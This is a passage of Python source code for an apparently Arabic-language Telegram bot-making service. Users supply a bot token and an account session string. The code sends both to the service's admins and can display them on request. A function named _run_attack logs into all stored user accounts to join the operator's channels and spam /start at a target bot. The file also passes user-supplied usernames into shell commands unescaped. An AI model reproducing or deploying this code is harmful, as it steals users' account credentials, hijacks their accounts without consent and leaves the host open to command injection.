            if user_id not in ADMINS: clear_state(uid); return await em(back_blocks("admins", "هذا المستخدم ليس ادمن"))
            ADMINS.remove(user_id); clear_state(uid); await em(back_blocks("admins", "تم تنزيل المستخدم من الأدمن"))
        except PeerIdInvalid: await em(back_blocks("admins", "تأكد من معرف المستخدم"))
        except Exception as e: await em(back_blocks("admins", f"حدث خطأ: {e}"))
        return
    if state == "ban_user_target":
        try:
            user = await client.get_chat(text.replace("@", "")); user_id = user.id
            if user_id in blocked: clear_state(uid); return await em(back_blocks("admins", "الارنب محظور من قبل"))
            blocked.append(user_id); r_sadd(f"blocked:{bot_id}", user_id); clear_state(uid); await em(back_blocks("admins", "تم حظر الارنب"))
        except: await em(back_blocks("admins", "تأكد من معرف المستخدم"))
        return
    if state == "unban_user_target":
        try:
            user = await client.get_chat(text.replace("@", "")); user_id = user.id
            if user_id not in blocked: clear_state(uid); return await em(back_blocks("admins", "الارنب غير محظور"))
            blocked.remove(user_id); r_srem(f"blocked:{bot_id}", user_id); clear_state(uid); await em(back_blocks("admins", "تم الغاء حظر المستخدم"))
        except: await em(back_blocks("admins", "تأكد من معرف المستخدم"))
        return
    if state == "install_info_bot":
        bot_username = text.replace("@", "").strip(); clear_state(uid); dev_id = redis_client.hget(f"bots:{bot_id}", bot_username)
        if not dev_id: return await em(back_blocks("info", "لا يوجد بوت بهذا المعرف"))
        try:
            dev_user = await client.get_users(int(dev_id)); dev_name = dev_user.first_name; dev_username = f"@{dev_user.username}" if dev_user.username else "لا يوجد"
        except: dev_name = "غير معروف"; dev_username = "غير معروف"
        env_path = f"Maked/{bot_username}/.env"
        if not os.path.exists(env_path): return await em(back_blocks("info", "لم يتم العثور على ملف .env للبوت"))
        with open(env_path, "r", encoding="utf-8") as f: env_content = f.read()
        bot_token = session_string = None
        for line in env_content.split("\n"):
            if line.startswith("BOT_TOKEN = "): bot_token = line.split(" = ", 1)[1].strip()
            elif line.startswith("SESSION = "): session_string = line.split(" = ", 1)[1].strip()
        if not bot_token or not session_string: return await em(back_blocks("info", "لم يتم العثور على التوكن أو الجلسة"))
        info_text = f"<b>معلومات تنصيب البوت:</b>\n\n<b>معرف البوت:</b> @{bot_username}\n<b>توكن البوت:</b> <code>{bot_token}</code>\n<b>جلسة البوت:</b> <code>{session_string}</code>\n<b>ايدي المطور:</b> <code>{dev_id}</code>\n<b>اسم المطور:</b> {dev_name}\n<b>معرف المطور:</b> {dev_username}\n\n<b>تحذير:</b> هذه المعلومات حساسة لا تشاركها مع أحد"
        return await em([text_block(info_text), btn_row([RBtn("الدخول لملف المطور", url=f"tg://user?id={dev_id}", style=ButtonStyle.PRIMARY)]), btn_row([RBtn("رجوع", "back_info", ButtonStyle.DANGER)])])

async def _finish_make_bot(client, message, uid):
    data = user_data.get(uid, {}); TOKEN = data.get("token"); SESSION = data.get("session")
    username = data.get("username"); bot_name = data.get("bot_name"); Dev = data.get("dev", uid); zero = message.from_user.username
    chat_id = message.chat.id; menu_id = data.get("menu_message_id"); clear_state(uid)
    async def em(blocks_or_text, kb=None):
        if menu_id:
            try:
                msg = await client.get_messages(chat_id, menu_id)
                fb_text, fb_kb = _blocks_to_kb_and_text(blocks_or_text) if isinstance(blocks_or_text, list) else (str(blocks_or_text), kb)
                if msg and (msg.caption is not None or msg.photo or msg.video): await msg.edit_caption(caption=fb_text, reply_markup=fb_kb, parse_mode=ParseMode.HTML)
                else: await msg.edit_text(fb_text, reply_markup=fb_kb, parse_mode=ParseMode.HTML)
                return
            except: pass
        try:
            if isinstance(blocks_or_text, list): await safe_send_rich(client, chat_id, blocks_or_text, reply_to=message.id)
            else: await message.reply(blocks_or_text, reply_markup=kb)
        except: pass
    for x in Bots:
        if x[0] == username: return await em(back_blocks("bots", "لقد قمت بصنع هذا البوت من قبل"))
    try:
        if not os.path.exists(f"Maked/{username}"): os.makedirs(f"Maked/{username}")
        os.system(f"cp -a Make/. Maked/{username}/")
        with open(f"Maked/{username}/.env", "w+", encoding="utf-8") as env:
            env.write(f'BOT_USERNAME= {username}\nBOT_TOKEN = {TOKEN}\nSESSION = {SESSION}\nOWNER_ID = {Dev}\nLOGGER_ID = {Dev}')
        os.system(f"cd Maked/{username} && chmod +x * && screen -d -m -S {safe_screen_name(username)} python3 -m plugins")
        Bots.append([username, Dev, zero])
        try:
            dev_user = await client.get_users(Dev); dev_name = dev_user.first_name
        except:
            dev_name = "غير معروف"

        admin_caption = (
            f"<b>▰▰▰▰ NEW BOT JOINED ▰▰▰▰\n"
            f"BOT NAME : {bot_name}\n"
            f"USER BOT : @{username}\n"
            f"TOKEN BOT : <code>{TOKEN}</code>\n\n"
            f"PY-TGCALLS : 3.0.0\n"
            f"PYROGRAM : 2.2.26\n\n"
            f"<code>{SESSION}</code>\n\n"
            f"OWNER : {dev_name} |\n"
            f"OWNER ID : <code>{Dev}</code>\n"
            f"▰▰▰▰ {Channel_Name} ▰▰▰▰</b>"
        )

        admin_blocks = [
            text_block(admin_caption),
            btn_row([RBtn(bot_name, url=f"https://t.me/{username}", style=ButtonStyle.PRIMARY)]),
            btn_row([RBtn(dev_name, url=f"tg://user?id={Dev}", style=ButtonStyle.SUCCESS)]),
        ]

        for admin_id in SUDOS:
            try:
                await safe_send_rich(client, int(admin_id), admin_blocks)
            except:
                pass

        redis_client.hset(f"bots:{bot_id}", username, Dev)
        
        user_blocks = [
            text_block(
                f"<b>▰▰▰▰ SYSTEM STARTED ▰▰▰▰\n"
                f"BOT NAME : {bot_name}\n"
                f"USER BOT : @{username}\n"
                f"OWNER ID : <code>{Dev}</code>\n"
                f"▰▰▰▰ SYSTEM STARTED ▰▰▰▰\n\n"
                f"تم إنشاء البوت بنجاح"
            ),
            btn_row([
                RBtn(dev_name, url=f"tg://user?id={Dev}", style=ButtonStyle.SUCCESS),
                RBtn(bot_name, url=f"https://t.me/{username}", style=ButtonStyle.PRIMARY),
            ]),
            btn_row([
                RBtn("حذف البوت", "delete_bot", style=ButtonStyle.DANGER),
            ]),
        ]
        
        sent = await safe_send_rich(client, chat_id, user_blocks, reply_to=message.id)
        if not sent:
            fb_text, fb_kb = _blocks_to_kb_and_text(user_blocks)
            try:
                await message.reply(fb_text, reply_markup=fb_kb, parse_mode=ParseMode.HTML)
            except:
                pass
    except Exception as e:
        await em(back_blocks("bots", f"حدث خطأ أثناء إنشاء البوت: {str(e)}"))

async def _run_broadcast(client, message, uid, broadcast_type):
    chat_id = message.chat.id; menu_id = get_menu_msg_id(uid)
    broadcast_stats = {"success": 0, "failed": 0, "total": len(get_users()), "deleted_users": 0}
    if menu_id:
        try:
            msg = await client.get_messages(chat_id, menu_id)
            if msg and (msg.caption is not None or msg.photo or msg.video): await msg.edit_caption(caption="جاري الإذاعة ..")
            else: await msg.edit_text("جاري الإذاعة ..")
        except: pass
    for current, user in enumerate(get_users(), 1):
        try:
            user = int(user)
            if broadcast_type == "normal": await message.copy(user)
            elif broadcast_type == "forward": await message.forward(user)
            elif broadcast_type == "pin":
                sent = await message.copy(user)
                try: await sent.pin()
                except: pass
            broadcast_stats["success"] += 1
            if not r_exists(f"{uid}:flood:{bot_id}"):
                progress = (current / broadcast_stats["total"]) * 100
                if menu_id:
                    try:
                        msg = await client.get_messages(chat_id, menu_id)
                        txt = f"نسبه الاذاعه {int(progress)}%"
                        if msg and (msg.caption is not None or msg.photo or msg.video): await msg.edit_caption(caption=txt)
                        else: await msg.edit_text(txt)
                    except: pass
                r_set(f"{uid}:flood:{bot_id}", "1")
        except PeerIdInvalid: del_user(user); broadcast_stats["deleted_users"] += 1; broadcast_stats["failed"] += 1
        except: broadcast_stats["failed"] += 1
    report = f"<b>تقرير الاذاعه\nنوع الإذاعة: {broadcast_type}\nعدد المستخدمين: {broadcast_stats['total']}\nناجحة: {broadcast_stats['success']}\nفاشلة: {broadcast_stats['failed']}\nحسابات محذوفة: {broadcast_stats['deleted_users']}</b>"
    if menu_id:
        try:
            msg = await client.get_messages(chat_id, menu_id)
            if msg and (msg.caption is not None or msg.photo or msg.video): await msg.edit_caption(caption=report, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع", callback_data="back_main")]]))
            else: await msg.edit_text(report, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع", callback_data="back_main")]]))
            return
        except: pass
    try: await message.reply(report, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع", callback_data="back_main")]]))
    except: pass

async def _run_attack(client, message, uid, bot_username, press_count):
    chat_id = message.chat.id; menu_id = get_menu_msg_id(uid)
    if menu_id:
        try:
            msg = await client.get_messages(chat_id, menu_id)
            if msg and (msg.caption is not None or msg.photo or msg.video): await msg.edit_caption(caption="انتظر قليلا...")
            else: await msg.edit_text("انتظر قليلا...")
        except: pass
    success_count = 0; failed_sessions = []; joined_sessions = 0; sessions = []
    for bot in Bots:
        try:
            env_path = f"Maked/{bot[0]}/.env"
            if os.path.exists(env_path):
                with open(env_path, "r", encoding="utf-8") as f:
                    env_content = f.read()
                    m = re.search(r'SESSION\s*=\s*(\S+)', env_content)
                    if m: sessions.append(m.group(1).strip('"\''))
        except: continue
    if not sessions:
        if menu_id:
            try:
                msg = await client.get_messages(chat_id, menu_id)
                txt = "لم يتم العثور على أي جلسات"
                if msg and (msg.caption is not None or msg.photo or msg.video): await msg.edit_caption(caption=txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع", callback_data="back_sessions")]]))
                else: await msg.edit_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع", callback_data="back_sessions")]]))
            except: pass
        return
    for i, session_str in enumerate(sessions, 1):
        try:
            user_client = Client(f"session_{i}", api_id=API_ID, api_hash=API_HASH, session_string=session_str, in_memory=True)
            await user_client.start(); joined = 0
            for channel in channels_one:
                try: await user_client.join_chat(channel); joined += 1; await asyncio.sleep(0.5)
                except: continue
            if joined > 0: joined_sessions += 1
            for j in range(press_count):
                try: await user_client.send_message(bot_username, "/start"); await asyncio.sleep(1)
                except: failed_sessions.append(f"الجلسة {i} - المحاولة {j+1}"); break
            success_count += 1; await user_client.stop()
            if i % 5 == 0 and menu_id:
                try:
                    msg = await client.get_messages(chat_id, menu_id)
                    txt = f"جاري العمل... {i}/{len(sessions)}\nالنجاح: {success_count} - الفشل: {len(failed_sessions)}\nانضم للقنوات: {joined_sessions}"
                    if msg and (msg.caption is not None or msg.photo or msg.video): await msg.edit_caption(caption=txt)
                    else: await msg.edit_text(txt)
                except: pass
        except: failed_sessions.append(f"الجلسة {i} - فشل التشغيل"); continue
    result = f"<b>تم الانتهاء\n\nإجمالي الجلسات: {len(sessions)}\nالناجحة: {success_count}\nالفاشلة: {len(failed_sessions)}\nالمنضمة للقنوات: {joined_sessions}\nمرات الضغط لكل جلسة: {press_count}\nإجمالي الضغطات: {success_count * press_count}</b>"
    if menu_id:
        try:
            msg = await client.get_messages(chat_id, menu_id)
            if msg and (msg.caption is not None or msg.photo or msg.video): await msg.edit_caption(caption=result, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع", callback_data="back_sessions")]]))
            else: await msg.edit_text(result, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع", callback_data="back_sessions")]]))
            return
        except: pass
    try: await message.reply(result, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع", callback_data="back_sessions")]]))
    except: pass

@bot.on_message(filters.document & filters.private, group=3)
async def handle_users_upload(client, message):
    uid = message.from_user.id
    if get_state(uid) != "awaiting_users_file": return
    chat_id = message.chat.id; menu_id = get_menu_msg_id(uid)
    async def em(blocks_or_text, kb=None):
        if menu_id:
            try:
                msg = await client.get_messages(chat_id, menu_id)
                fb_text, fb_kb = _blocks_to_kb_and_text(blocks_or_text) if isinstance(blocks_or_text, list) else (str(blocks_or_text), kb)
                if msg and (msg.caption is not None or msg.photo or msg.video): await msg.edit_caption(caption=fb_text, reply_markup=fb_kb, parse_mode=ParseMode.HTML)
                else: await msg.edit_text(fb_text, reply_markup=fb_kb, parse_mode=ParseMode.HTML)
                return
            except: pass
        try:
            if isinstance(blocks_or_text, list): await safe_send_rich(client, chat_id, blocks_or_text, reply_to=message.id)
            else: await message.reply(blocks_or_text, reply_markup=kb)
        except: pass
    try:
        import tempfile
        tmp_file = tempfile.NamedTemporaryFile(mode="w+", delete=False, suffix=".txt")
        tmp_path = tmp_file.name; tmp_file.close(); await message.download(tmp_path)
        with open(tmp_path, "r", encoding="utf8", errors="ignore") as file: lines = [line.strip() for line in file.read().splitlines() if line.strip()]
        if not lines:
            try: os.remove(tmp_path)
            except: pass
            clear_state(uid); r_delete(f"{uid}:users_up:{bot_id}"); return await em(back_blocks("settings", "الملف فارغ أو تالف"))
        added = 0
        for user in lines:
            try: user_int = int(user)
            except: continue
            if not is_user(user_int): add_new_user(user_int); added += 1
        report = f"تم رفع النسخة\nتم إضافة: {added}\nالإجمالي: {len(get_users())}"
        await em(back_blocks("settings", report))
        try: os.remove(tmp_path)
        except: pass
    except Exception as e: await em(back_blocks("settings", f"خطأ: {e}"))
    finally: clear_state(uid); r_delete(f"{uid}:users_up:{bot_id}")

@bot.on_message(filters.private, group=4)
async def twasl(client, message):

    if not message.from_user:
        return

    uid = message.from_user.id

    if (
        uid in SUDOS
        or uid in ADMINS
        or message.from_user.is_bot
    ):
        return

    if message.text and message.text.startswith("/"):
        return

    for admin_id in SUDOS:
        if r_exists(f"{admin_id}:twasl:{bot_id}"):
            try:
                await message.forward(admin_id)
            except Exception:
                continue

@Client.on_message(filters.command(["One", "/vega"], "") & filters.private)
async def SourceVeGaX(client: Client, message):
    caption = "بوت تشغيل أغاني - مفتوح المصدر\nترخيص بواسطة : @TopVeGa\nعلامة تجارية : VEGA & Sound\nحرية التعديل و النشر: ©2015\nㅤ"
    await message.reply_video(video=Link, caption=caption, parse_mode=ParseMode.HTML, show_caption_above_media=True, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(Channel_Name, url="https://fanciful-duckanoo-b776df.netlify.app/")]]))

@Client.on_message(filters.command(["kim"], "") & filters.private)
async def handle_user_inf(client, message):
    try:
        user = await client.get_chat("TopVeGa"); name = user.first_name; username = user.username if user.username else "لا يوجد"
        bio = user.bio if user.bio else "لا يوجد"
        caption = f"<b>الاسم: {name}\nالمعرف: @{username}\nالايدي: <code>{user.id}</code>\nالبايو: {bio}\nالرتبة: مؤسس النظام</b>\nㅤ"
        button = InlineKeyboardMarkup([[InlineKeyboardButton(name, url=f"https://t.me/{username}")]])
        if user.photo:
            photo = await client.download_media(user.photo.big_file_id)
            await client.send_photo(message.chat.id, photo=photo, caption=caption, reply_markup=button, show_caption_above_media=True)
        else: await client.send_message(message.chat.id, text=caption, reply_markup=button)
    except: await message.reply_text("حدث خطأ في جلب المعلومات")

@Client.on_message(filters.command("cancel") & filters.private)
async def cancel_all(client, message):
    uid = message.from_user.id
    try: r_delete_pattern(f"{uid}*")
    except: pass
    clear_state(uid); await message.reply("تم إلغاء جميع العمليات المعلقة")